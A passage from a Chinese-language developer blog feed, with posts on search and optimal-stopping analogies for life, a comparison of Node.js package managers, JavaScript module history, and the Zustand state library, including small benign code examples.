high，它們分別指向書的開頭和結尾。</li><li>找到中間頁：計算中間的頁面，這樣你就知道從哪裡開始查找。</li><li>比較內容：<ul><li>如果中間的頁面是你要找的內容，那麼你就找到了！</li><li>如果中間頁的內容比你要找的內容小，那麼你可以只查找後半部分，因為前半部分的內容一定不會是你要找的。</li><li>如果中間頁的內容比你要找的內容大，那麼你就查找前半部分。</li></ul></li><li>重複這些步驟：繼續重複上面的步驟，直到找到你想要的內容，或者確定它不在書裡。</li></ol><p>想像你在沙灘上撿貝殼，從一端開始檢查，當你發現某一區域的貝殼特別好看時，你可以透過「分半」的方法縮小搜尋範圍，只集中在那些區域繼續尋找。</p><h2 id="最佳停下策略"><a href="#最佳停下策略" class="headerlink" title="最佳停下策略"></a>最佳停下策略</h2><p>最佳停下策略（Optimal Stopping Problem）是一種數學問題，涉及到在某個過程中做出決策，選擇最佳時機停止這個過程，以達到最大的收益或最佳結果。</p><p>最佳停下策略就像在沙灘上撿貝殼。想像一下，你走在沙灘上，想要找到最漂亮的貝殼。你會發現，當潮水退去的時候，沙灘上會露出很多貝殼，這時候是撿貝殼的最佳時機。</p><p>如果你在潮水高漲的時候撿貝殼，很多貝殼可能被水覆蓋，你就很難找到它們。相反，當潮水退去，你能看到更多的貝殼，這樣就能輕鬆挑選到最美麗的那一個。</p><p>這個比喻告訴我們，在做決策的時候，選擇適當的時機就像在潮水退去時撿貝殼一樣重要。當你觀察了一段時間後，了解了沙灘上貝殼的情況，然後選擇在最佳的時機去撿，才能找到最好的選擇。這樣一來，你就能獲得最滿意的結果！</p><p>最佳停下策略通常涉及以下幾個步驟：</p><ol><li>定義目標：確定你想要達到的目標，比如獲得最高的收益或選擇最佳的選項。</li><li>評估選項：觀察一段時間內的選擇並記錄下它們的特徵，以了解整體情況。</li><li>設置停下點：根據之前的觀察，決定在什麼時候停止觀察並選擇目前最好的選項。</li></ol><p>在最佳停下策略中，有一個經典的例子是「37%法則」。這個法則適用於許多情況，例如：</p><p>如果你要找一位伴侶，你可以在前 37% 的時間內約會，但在此之後你就需要選擇你遇到的下一位人選。這是因為 37% 大約是整體的 1&#x2F;e（e 是一個數學常數，約為 2.718），這個比例可以幫助你找到最佳的選擇。</p><h2 id="為什麼演唱會總是聽一場少一場"><a href="#為什麼演唱會總是聽一場少一場" class="headerlink" title="為什麼演唱會總是聽一場少一場"></a>為什麼演唱會總是聽一場少一場</h2><p>每位歌手的演藝生涯如同一片沙灘，這片沙灘是有限的，但上面卻散落著無數美麗的貝殼。每場演唱會就像一個貝殼，而歌手的巔峰時期則是我們最想抓住的瞬間，因為那時的表現最為精彩。</p><p>在生活的初期，我們可以利用快速的二分法來選擇自己喜歡的歌手和音樂風格，像是在沙灘上迅速切換區域尋找合適的貝殼。有些事情若不及早行動，未來可能就無法再得到當下的體驗。就如同撿貝殼，若拖得太久，潮水會再次湧來，淹沒沙灘，留下的將是與當下截然不同的景象。</p><p>如果我們不在合適的時候參加喜歡的歌手演唱會，隨著時間的推移，歌手的表現也許不再那麼出色，選擇也會變得有限。在人生的前 37% 時間裡，我們應該儘可能探索、體驗並觀察周圍的環境，了解貝殼的種類和數量，然後在合適的時機做出決定。</p><p>提早參加演唱會的決策能讓我們抓住那些珍貴的音樂瞬間。歌手的最佳時機如潮水退去時，讓我們更容易找到美好的貝殼。</p><p>珍惜這些時刻，才能避免未來的遺憾。</p>]]></content>
      
      
      <categories>
          
          <category> 人生演算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Node.js 模組管理工具比較</title>
      <link href="/2024/10/13/javascript/javascript-module-management-tool/"/>
      <url>/2024/10/13/javascript/javascript-module-management-tool/</url>
      
        <content type="html"><![CDATA[<p>在 Node.js 生態系統中，選擇合適的模組管理工具就像選擇神奇寶貝御三家一樣，是提升開發效率並成為開發大師的關鍵。</p><p>本文將深入比較四種流行的 Node.js 模組管理工具: npm、pnpm、yarn 和 bun，分析它們的優缺點，幫助開發者根據專案需求做出明智的決策。</p><h2 id="npm-優勢與劣勢分析"><a href="#npm-優勢與劣勢分析" class="headerlink" title="npm 優勢與劣勢分析"></a>npm 優勢與劣勢分析</h2><p>npm (Node Package Manager) 是隨 Node.js 安裝的官方模組管理工具，擁有最大的生態系統和眾多的開源套件。</p><p>就像是最常見的御三家傑尼龜一樣，水善利萬物而不爭，沒有固定的形狀，可以放在任何容器內。</p><ul><li>安裝方便：作為 Node.js 的一部分，自動安裝，無需額外配置，對初學者友好。</li><li>社群支持：擁有龐大的使用者基礎和豐富的文件，問題解決和資源尋找相對容易，仿佛你的大木博士隨時待命。</li><li>功能完整：支持版本管理、依賴樹、腳本執行等多種功能。</li></ul><p>優點：</p><ul><li>簡單易用，適合新手，像初學者第一隻選擇的神奇寶貝。</li><li>大量的第三方工具可供使用。</li></ul><p>缺點：</p><ul><li>重複依賴：安裝過程中經常會產生大量重複依賴，浪費硬碟空間，這就像收集太多重複的基礎神奇寶貝一樣煩人。</li><li>效能問題：隨著依賴數量增多，安裝和更新速度較慢。</li></ul><p>在 mono repo 中的適用性:</p><p>雖然可以使用 npm workspaces 功能來管理多個專案，但在大型專案中性能和管理上可能不夠理想。</p><h2 id="pnpm-空間魔術師"><a href="#pnpm-空間魔術師" class="headerlink" title="pnpm 空間魔術師"></a>pnpm 空間魔術師</h2><p>如果你想要一隻像妙蛙種子一樣善於整理和保存能量的神奇寶貝，pnpm (Performant NPM) 就是你的最佳選擇！</p><p>pnpm 專注於提高安裝效率和節省磁碟空間，像極了依賴背上種子成長的妙蛙種子。</p><ul><li>儲存機制：使用符號連結的方式儲存依賴，避免重複下載同一套件。</li><li>速度快：由於共享依賴和高效的緩存機制，安裝速度通常快於 npm。</li><li>平行安裝：支持平行安裝多個依賴，進一步提升安裝效率。</li></ul><p>優點：</p><ul><li>大幅減少磁碟空間佔用。</li><li>安裝速度快，對於大型專案尤為明顯。</li></ul><p>缺點：</p><ul><li>對於某些特定的 npm 生態系統功能（如某些特定的腳本）支持可能有限。</li></ul><p>在 mono repo 中的適用性:</p><p>pnpm 的 workspaces 功能非常適合 mono repo，通過符號連結和共享依賴來減少磁碟空間的使用，並提高安裝速度。</p><p>因此，它是管理 mono repo 的最低成本選擇。</p><h2 id="yarn-穩定性與速度的平衡"><a href="#yarn-穩定性與速度的平衡" class="headerlink" title="yarn 穩定性與速度的平衡"></a>yarn 穩定性與速度的平衡</h2><p>yarn 是 Facebook 開發的一個替代 npm 的模組管理工具，旨在提高安裝速度和穩定性。</p><p>就像御三家裡面攻擊力最高的小火龍一樣，進化過後甚至還能夠飛行，但也像小火龍一樣尾巴上的火焰代表目前的心情，剛開始會需要多看一些錯誤訊息來處理套用到專案中的問題。</p><ul><li>快取機制：yarn 使用快取來避免重複下載相同的依賴，加快安裝速度。</li><li>鎖定檔：使用 yarn.lock 檔案來確保所有開發者在安裝依賴時使用相同版本，增強了專案的穩定性。</li><li>並行安裝：支援並行安裝多個依賴，進一步提升安裝效率。</li></ul><p>優點：</p><ul><li>安裝速度快，對於大型專案的依賴管理特別有用。</li><li>鎖定機制使專案更穩定，避免因依賴版本不一致而產生的問題。</li></ul><p>缺點：</p><ul><li>在某些情況下，yarn 的配置可能會較為複雜。</li></ul><p>在 mono repo 中的適用性:</p><p>yarn 的 workspaces 功能非常適合 mono repo，並且鎖定機制可以有效管理多個包的版本。</p><p>其實可以直接看 <a href="https://github.com/facebook/react">Facebook React 的 repo</a> 其實就是 mono repo 的一個配置。</p><h2 id="bun-新興工具的潛力"><a href="#bun-新興工具的潛力" class="headerlink" title="bun 新興工具的潛力"></a>bun 新興工具的潛力</h2><p>bun 是一個較新的 JavaScript 執行環境，除了是一個模組管理工具外，還集成了打包器和開發伺服器等功能。</p><p>可以把 bun 想成御三家以外的皮卡丘！一開始可能完全不知道該怎麼做比較好，但熟悉了之後是很有機會能成為神奇寶貝大師。</p><ul><li>全方位功能：不僅僅是模組管理，還包括打包和執行 JavaScript 程式碼的能力。</li><li>極快的安裝速度：由於內部優化，bun 在安裝和啟動應用方面表現非常迅速。</li><li>開發者友好：擁有現代化的 CLI 和良好的開發者體驗。</li></ul><p>優點：</p><ul><li>綜合性強，適合希望減少工具鏈的開發者。</li><li>安裝和運行速度快，尤其適合開發階段。</li></ul><p>缺點：</p><ul><li>還在不斷發展中，可能存在穩定性和兼容性問題。</li><li>社群和文件相對較少，遇到問題時尋找資源可能較困難。</li></ul><p>在 mono repo 中的適用性，對於小型或中型專案，bun 可以是快速的選擇，但對於大型專案的支持可能尚不穩定。</p><h2 id="如何選擇合適的-Node-js-模組管理工具"><a href="#如何選擇合適的-Node-js-模組管理工具" class="headerlink" title="如何選擇合適的 Node.js 模組管理工具"></a>如何選擇合適的 Node.js 模組管理工具</h2><p>選擇合適的 Node.js 模組管理工具取決於專案的需求和開發者的使用習慣：</p><p>npm：對於初學者和中小型專案，npm 是一個穩妥的選擇，但在大型專案的性能上可能有所不足。<br>pnpm：對於需要高效安裝和磁碟空間使用的專案，pnpm 是最佳選擇，特別是在管理 mono repo 時。<br>yarn：對於需要高效安裝和專案穩定性的開發者，yarn 提供了良好的解決方案，尤其適合大型專案。<br>bun：對於希望整合更多功能的開發者，bun 提供了一個快速且現代的開發體驗，但可能需要承擔一定的穩定性風險。</p><p>希望這篇關於 Node.js 模組管理工具的比較能幫助你選擇最合適的解決方案。</p><p>無論是選擇 npm、pnpm、bun 還是 yarn，了解每個工具的特點將使你的開發流程更高效。</p><p>如果你對這些工具有任何疑問，請隨時留言討論！</p>]]></content>
      
      
      <categories>
          
          <category> Frontend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人生的貪婪演算法</title>
      <link href="/2024/10/06/life-thinking-algorithm/greedy-algorithm-for-your-life/"/>
      <url>/2024/10/06/life-thinking-algorithm/greedy-algorithm-for-your-life/</url>
      
        <content type="html"><![CDATA[<p>貪婪演算法是一種常用的算法，尤其在圖論中的最小成本生成樹中應用廣泛。</p><h2 id="貪婪演算法"><a href="#貪婪演算法" class="headerlink" title="貪婪演算法"></a>貪婪演算法</h2><p>演算法根據當前狀況選擇最佳解，但往往忽略了全域的最佳解。</p><p>舉個例子，當我們從南投前往高雄時，可能面臨以下選擇：</p><ol><li>計程車 (2.5 小時)</li><li>先坐公車到台中高鐵 (30 分鐘)</li><li>先坐公車到台中市 (40 分鐘)</li></ol><p>在此情況下，貪婪演算法會選擇第二個選項，因為它當下時間成本最低，但不一定能最快到達目的地。</p><h2 id="貪婪演算法的生活應用"><a href="#貪婪演算法的生活應用" class="headerlink" title="貪婪演算法的生活應用"></a>貪婪演算法的生活應用</h2><p>想像你在沙灘上行走，隨著每一步你看到的貝殼都吸引著你。你可能會選擇最眼前的那一個，但這樣可能會錯過更美好的選擇。</p><p>生活中，我們常常面對類似的情況：短期的快樂，如看電視或吃零食，往往會掩蓋長期的幸福，這來自於努力學習、交朋友和實現夢想。</p><h2 id="強化學習與長期選擇"><a href="#強化學習與長期選擇" class="headerlink" title="強化學習與長期選擇"></a>強化學習與長期選擇</h2><p>強化學習就像一位智慧的收藏家，通過經驗來改進選擇。</p><p>不僅依賴眼前的選擇，還要記錄過去的經驗，發現哪些選擇是值得珍惜的。</p><p>這種方式能夠幫助我們在生活中不斷接近最佳選擇。</p><h2 id="成本與時間的考量"><a href="#成本與時間的考量" class="headerlink" title="成本與時間的考量"></a>成本與時間的考量</h2><p>生活的每一個選擇都需要時間和精力的投入。隨著年齡的增長，我們可能會面臨對選擇的懷疑。</p><p>過去的努力是否真的帶來了期望的回報？在這過程中，我們或許會忽視了自身的需求和期望。</p><blockquote><p>無論是衰老還是死亡，都是人類這種生命短暫的生物才有的美好</p></blockquote><h2 id="追求幸福的智慧"><a href="#追求幸福的智慧" class="headerlink" title="追求幸福的智慧"></a>追求幸福的智慧</h2><p>在過去十年的工作中，儘管我努力學習和成長，最終的收穫卻只是微薄的薪水，這讓我開始思考工作的意義。</p><p>有時候常覺得自己只是找到當下的最佳解，雖然回顧過去不後悔自己的選擇，但也對追逐年薪百萬的美好幻想產生了懷疑，這些似乎只是空洞的承諾和完成 KPI 的結果。</p><blockquote><p>炎柱: 我會善盡我的職責，在場的任何一個人都不會死。</p></blockquote><iframe width="560" height="315" src="https://www.youtube.com/embed/HSoJZnzLXHk?si=mvj9Q9oOPraOoZ_k" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>但在場的任何一個人，不包含，我自己。</p><p>我們滿足了家人和社會的期待，但卻未曾思考如何真正地生活。雖然月薪不斷增加，但人生卻是在過一天就少一天。</p><p>成就感和滿足感或許應該真的分開來看，一個是社會給的，另外一個才比較接近自己給的。</p><p>近期，我遇到了許多新朋友，聽到了各種人生故事。雖然現在的我似乎處於能量的低谷，但這也讓我更加渴望理解自己與這個世界。</p><p>最近報名參加了許多課程和工作坊，想要嘗試補回些什麼，但卻感到有些急於求成。在面對龐大的資訊量時，我發現無法迅速理解所有選擇，正如我的好室友和高中同學所說，完全掌握所有知識並不現實。</p><p>貪婪演算法告訴我們，單靠眼前的選擇可能不夠，而強化學習則教會我們如何根據經驗不斷改善選擇。</p><p>然而，我們也要意識到，追求最佳解並不總是有效率。過多時間在每個可能選擇上徘徊，可能會讓我們失去享受生活的機會。</p><p>透過強化學習，我們應該考慮整個環境的平均餘命，去計算我們還有多少時間來做出選擇。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/qaCMghHWyjM?si=2yqhzyPsigcbrnQT" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>在生活中，也許健康和自我理解也是我們最重要的成就，讓我們在享受當下的同時，探索那些隱藏的美好，才能真正感受滿足。</p><p>延伸閱讀: <a href="https://linyencheng.github.io/2025/08/09/kimetsu-no-yaiba/rengoku-kyoujurou-be-true-be-you/">成為自己看得起的大人: 那些鬼滅告訴我的事情</a></p>]]></content>
      
      
      <categories>
          
          <category> 人生演算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 模組超進化</title>
      <link href="/2024/10/03/javascript/javascript-module/"/>
      <url>/2024/10/03/javascript/javascript-module/</url>
      
        <content type="html"><![CDATA[<p>JavaScript 模組超進化，從沒有元件概念的開端，到 React 引入的元件化概念，開始了大前端時代的工業革命時代，也是那個時候開始，有了專職的前端工程師職位，也才有各位大大們現在認識的小編。</p><p>隨後是 Module Federation 的靈活性、ESM 的即時載入功能、瀏覽器支援遠端載入的技術，這一切都是技術進步的積累，也大大提高了大家對於前端工程的想像，當然這也直接的反應到薪水的成長。</p><p>當代 LLM 和 Gen AI 的發展不僅提高了開發效率，也擺脫了過去的束縛開始有機會從遠端動態生成元件，因此能用更理性、科學的思想與行動方法極大擴展了創作的可能性，開始了大前端時代文藝復興。</p><p>小編認為，大前端的航海時代還會繼續下去，隨著世界科技的進步與普及從量變走向了質變，未來的工程師也許會漸漸轉變成哲學家也或著是藝術家，為了人們的滿足和幸福感而努力。</p><h2 id="JavaScript-的單線程特性"><a href="#JavaScript-的單線程特性" class="headerlink" title="JavaScript 的單線程特性"></a>JavaScript 的單線程特性</h2><p>JavaScript 作為一種單線程（Single Thread）的語言，意味著它在任何時刻只能處理一個任務。</p><p>在這樣的架構下，前端開發的歷程充滿挑戰，然而隨著技術的進步，這種限制開始逐漸被打破。</p><h2 id="React-js-的誕生：前端的工業革命"><a href="#React-js-的誕生：前端的工業革命" class="headerlink" title="React.js 的誕生：前端的工業革命"></a>React.js 的誕生：前端的工業革命</h2><p>最初，網頁應用開發缺乏元件的概念，直到 Facebook 推出了 React.js，這一切才開始改變。</p><p>React.js 引入了「元件」的概念，使得前端開發進入了一個全新的工業革命時代。</p><p>這種元件化的設計使得開發者能夠將大型應用拆解為小而可重用的元件，每個元件負責自己的狀態和渲染，從而提高了程式碼的可維護性與可讀性。</p><p>元件化的好處</p><ul><li>重用性：元件可以在不同的部分或項目中重複使用，這降低了重複勞動的需要。</li><li>封裝性：每個元件都獨立管理自己的狀態和行為，減少了不同元件之間的相互影響，從而提高了程式碼的穩定性。</li><li>便於測試：小型元件更容易進行單元測試，開發者可以快速發現和修復問題。</li></ul><h2 id="ESM-的出現：即時載入元件的可能性"><a href="#ESM-的出現：即時載入元件的可能性" class="headerlink" title="ESM 的出現：即時載入元件的可能性"></a>ESM 的出現：即時載入元件的可能性</h2><p>隨著時間的推移，JavaScript 的模組系統進一步演化，尤其是 ESM（ECMAScript Modules）的出現，為前端開發帶來了革命性的變化。ESM 使得開發者能夠以簡單的語法來導入和導出模組，這樣的結構讓程式碼更為清晰且易於管理。</p><h3 id="ESM-的特點"><a href="#ESM-的特點" class="headerlink" title="ESM 的特點"></a>ESM 的特點</h3><p>ESM：簡單的項目中，開發者可以直接使用 ESM 管理依賴，這使得開發流程更簡單。例如，在單頁應用中，使用 ESM 來組織和分割程式碼。</p><ul><li>語法簡潔：使用 import 和 export 關鍵字，開發者可以輕鬆地管理依賴。</li><li>靜態分析：ESM 支援靜態分析工具，可以在編譯時檢查程式碼的正確性，提升開發效率。</li><li>瀏覽器支援：現代瀏覽器原生支援 ESM，開發者無需額外的打包工具即可使用模組化的功能。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">greet</span> = (<span class="params"></span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; greet &#125; <span class="keyword">from</span> <span class="string">&quot;./module.js&quot;</span>;</span><br><span class="line"><span class="title function_">greet</span>(); <span class="comment">// Hello, World!</span></span><br></pre></td></tr></table></figure><h3 id="Module-Federation"><a href="#Module-Federation" class="headerlink" title="Module Federation"></a>Module Federation</h3><p>Module Federation，是 Webpack 4 引入的功能，允許多個應用共享模組，無論它們的版本或應用的大小如何。</p><p>這使得大型應用可以更靈活地互動。例如，應用 A 可以動態載入來自應用 B 的模組，無需重新編譯或打包。</p><p>Module Federation 適合大型應用或微前端架構的項目，允許不同的團隊在相同的應用中使用不同版本的模組而不產生衝突。</p><p>例如，在一個大型電商平台中，產品展示和購物車功能可以由不同的團隊維護，卻能無縫協作。</p><h3 id="Web-Components"><a href="#Web-Components" class="headerlink" title="Web Components"></a>Web Components</h3><p>Web Components，是一種建立可重用的自定義元素的標準。在開發 UI 元件庫時，Web Components 可以提供高度的重用性。例如，設計一個自定義的按鈕元件，這個按鈕可以在多個應用中使用，並且保持一致的外觀和行為。</p><p>Web Components 允許開發者創建自己的 HTML 標籤，這些標籤可以在任何框架或庫中使用。這對於創建可重用的 UI 元件特別有用，但需要額外的支持來處理瀏覽器的兼容性問題。</p><h3 id="現代瀏覽器支持與-LLM-的協同影響"><a href="#現代瀏覽器支持與-LLM-的協同影響" class="headerlink" title="現代瀏覽器支持與 LLM 的協同影響"></a>現代瀏覽器支持與 LLM 的協同影響</h3><p>隨著現代瀏覽器原生支持透過 URL 載入 JavaScript 模組（ESM），開發者現在可以更方便地引入外部資源，實現模組化和動態載入的功能。這種即時載入的能力為整個開發生態系統注入了活力，尤其是在使用大型語言模型（LLM）和生成式人工智慧（Gen AI）時。</p><h3 id="LLM-與生成式人工智慧的影響：前端的文藝復興"><a href="#LLM-與生成式人工智慧的影響：前端的文藝復興" class="headerlink" title="LLM 與生成式人工智慧的影響：前端的文藝復興"></a>LLM 與生成式人工智慧的影響：前端的文藝復興</h3><p>近年來，隨著大型語言模型（LLM）和生成式人工智慧（Gen AI）的崛起，元件的生成進一步變得動態且智能。開發者可以透過遠端載入的方式，讓元件更具適應性，這是否意味著前端的文藝復興？</p><h2 id="Javascript-模組的未來"><a href="#Javascript-模組的未來" class="headerlink" title="Javascript 模組的未來"></a>Javascript 模組的未來</h2><p>從無元件的開端，到 React 引入的元件化概念，再到需要編譯的過程，隨後是 ESM 的即時載入功能、Module Federation 的靈活性，直到瀏覽器支持遠端載入的技術，這一切都是技術進步的積累。如今，LLM 的應用使得我們能夠從遠端動態生成元件，這樣的發展不僅提高了開發效率，也極大擴展了創作的可能性。</p><p>實例：開發者可以使用 LLM 輸入「創建一個帶有動畫的按鈕元件」，然後 LLM 生成相應的元件程式碼，再透過 ESM 快速在應用中引入這個元件，實現快速迭代和實驗。</p><p>未來的潛力：這種結合不僅限於單一元件的創建，還可能演變成全新的開發模式，使開發者能夠專注於高層次的設計與邏輯，而將具體的實現細節交給智能工具。</p><p>總的來說，JavaScript 模組的演進不僅是技術的革新，更是思維的轉變。在這個大前端時代，未來仍然有許多驚喜在等待我們去探索，新的技術將不斷推動我們的創意，開創更多可能性。</p>]]></content>
      
      
      <categories>
          
          <category> Frontend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>為什麼選擇 Zustand 作為最佳狀態管理解決方案</title>
      <link href="/2024/10/02/react/react-store-zustand/"/>
      <url>/2024/10/02/react/react-store-zustand/</url>
      
        <content type="html"><![CDATA[<p>當我選擇 Zustand 作為狀態集中管理的解決方案時，有很多原因促使我做出這個決定。Zustand 的輕量級和彈性特性使其在架構上無縫穿梭於專案的各個角落，避免了因架構限制而導致的可讀性下降和優化難度增加。</p><p>以下是我使用 Zustand 快兩年後的一些心得，從幾個層面來分析。</p><h2 id="為什麼不該再繼續用-Redux-了？"><a href="#為什麼不該再繼續用-Redux-了？" class="headerlink" title="為什麼不該再繼續用 Redux 了？"></a>為什麼不該再繼續用 Redux 了？</h2><p>選擇狀態集中管理的解決方案時，Zustand 的輕量級和彈性特性讓我不再依賴 Redux。儘管 Redux 曾經為 FLUX 單向資料流提供接近典範的解決方案，但隨著時間推移，它逐漸暴露出以下問題：</p><h2 id="Redux-的局限性"><a href="#Redux-的局限性" class="headerlink" title="Redux 的局限性"></a>Redux 的局限性</h2><ul><li>樣板程式碼繁多：Redux 需要大量的樣板程式碼，包括 actions、reducers 和 store 的設置，這增加了開發的複雜性。</li><li>過度抽象：對於剛進入前端領域的開發者來說，Redux 的抽象層可能使簡單的狀態管理變得複雜，這對於小型或中型應用來說顯得多餘。而且，理解 Redux 的工作原理（如中間件和非同步處理）需要時間，可能影響團隊的開發效率。</li><li>效能問題: 在狀態更新過程中，Redux 可能導致不必要的重新渲染，這在大型應用中會成為性能瓶頸。</li></ul><p>隨著 React 的演進，如 Hooks 的加入，Redux 的生態系統顯得越來越過時，儘管 Redux Toolkit 嘗試解決這些問題，但歷史的包袱仍然存在。因此，我開始探索更好的選擇。</p><h2 id="Zustand-的特點與優勢"><a href="#Zustand-的特點與優勢" class="headerlink" title="Zustand 的特點與優勢"></a>Zustand 的特點與優勢</h2><p>在使用 Zustand 快兩年後，我從以下幾個層面進行了分析：</p><h3 id="簡單易用的文件"><a href="#簡單易用的文件" class="headerlink" title="簡單易用的文件"></a>簡單易用的文件</h3><p>官方文件清晰可讀，並具有可愛的設計和滾動視差效果。這不僅提高了開發者的學習效率，也使得查找資訊變得更加直觀。此外，Zustand 的社群也提供了大量的範例和教程，進一步降低了入門的難度。</p><h3 id="無需轉換-DevTool"><a href="#無需轉換-DevTool" class="headerlink" title="無需轉換 DevTool"></a>無需轉換 DevTool</h3><p>從 Redux 轉移過來時，原有的 DevTool 可以直接使用，降低了學習成本。這意味著開發者可以快速上手，無需重複學習工具的使用方法，從而提高開發效率。</p><h3 id="快速入門"><a href="#快速入門" class="headerlink" title="快速入門"></a>快速入門</h3><p>QuickStart 實現迅速，讓開發者能夠迅速上手，Zustand 使用 hooks 來管理狀態，這與 React 的設計理念更加契合，使得狀態的使用變得更直觀。</p><p>官網簡潔易懂： <a href="https://zustand-demo.pmnd.rs/">https://zustand-demo.pmnd.rs/</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; create &#125; <span class="keyword">from</span> <span class="string">&quot;zustand&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> useStore = <span class="title function_">create</span>(<span class="function">(<span class="params">set</span>) =&gt;</span> (&#123;</span><br><span class="line">  <span class="attr">count</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">inc</span>: <span class="function">() =&gt;</span> <span class="title function_">set</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> (&#123; <span class="attr">count</span>: state.<span class="property">count</span> + <span class="number">1</span> &#125;)),</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Counter</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; count, inc &#125; = <span class="title function_">useStore</span>();</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;count&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;inc&#125;</span>&gt;</span>one up<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Zustand-設計模式-Slice-Pattern"><a href="#Zustand-設計模式-Slice-Pattern" class="headerlink" title="Zustand 設計模式: Slice Pattern"></a>Zustand 設計模式: Slice Pattern</h2><p>Zustand 提供的 Slice Pattern 使狀態管理更加模組化，便於組織和擴展。</p><p>這種設計模式讓開發者可以將狀態劃分為不同的「切片」，每個切片可以獨立管理，這樣不僅提高了可讀性，還促進了團隊的協作開發，因為不同的開發者可以同時在不同的切片上工作，降低了衝突的風險。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">createFishSlice</span> = (<span class="params">set</span>) =&gt; (&#123;</span><br><span class="line">  <span class="attr">fishes</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">addFish</span>: <span class="function">() =&gt;</span> <span class="title function_">set</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> (&#123; <span class="attr">fishes</span>: state.<span class="property">fishes</span> + <span class="number">1</span> &#125;)),</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">createBearSlice</span> = (<span class="params">set</span>) =&gt; (&#123;</span><br><span class="line">  <span class="attr">bears</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">addBear</span>: <span class="function">() =&gt;</span> <span class="title function_">set</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> (&#123; <span class="attr">bears</span>: state.<span class="property">bears</span> + <span class="number">1</span> &#125;)),</span><br><span class="line">  <span class="attr">eatFish</span>: <span class="function">() =&gt;</span> <span class="title function_">set</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> (&#123; <span class="attr">fishes</span>: state.<span class="property">fishes</span> - <span class="number">1</span> &#125;)),</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; create &#125; <span class="keyword">from</span> <span class="string">&quot;zustand&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createBearSlice &#125; <span class="keyword">from</span> <span class="string">&quot;./bearSlice&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createFishSlice &#125; <span class="keyword">from</span> <span class="string">&quot;./fishSlice&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useBoundStore = <span class="title function_">create</span>(<span class="function">(<span class="params">...a</span>) =&gt;</span> (&#123;</span><br><span class="line">  ...<span class="title function_">createBearSlice</span>(...a),</span><br><span class="line">  ...<span class="title function_">createFishSlice</span>(...a),</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><h2 id="Zustand-X-個人職涯發展"><a 